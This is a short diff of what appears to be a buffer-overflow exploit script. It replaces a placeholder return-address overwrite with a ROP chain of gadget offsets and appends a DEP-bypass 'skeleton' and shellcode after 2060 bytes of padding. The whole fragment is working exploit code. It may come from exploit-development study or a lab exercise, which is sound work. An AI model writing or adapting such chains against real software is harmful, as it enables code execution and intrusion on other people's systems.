@@ -219,7 +219,7 @@ rop = [
     base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
     base + 0x2cec, # mov eax, edx ; ret
     base + 0x2b38, # pop ecx ; ret
-    0x18, # eax + ? = skeleton call
+    0x18,          # eax + ? = skeleton call
     base + 0x9b36, # add eax, ecx ; pop ebx ; ret
     0xffffffff, # junk for pop ebx
     base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
@@ -258,7 +258,7 @@ skeleton += pack("<I", 0x40) # flProtect <- 0x40
 # ===
 
 buf  = b"A" * 2060
-buf += b"B" * 4 # ROP
+buf += rop # ROP
 buf += skeleton
 buf += shellcode
 buf += b"C" * ropSize
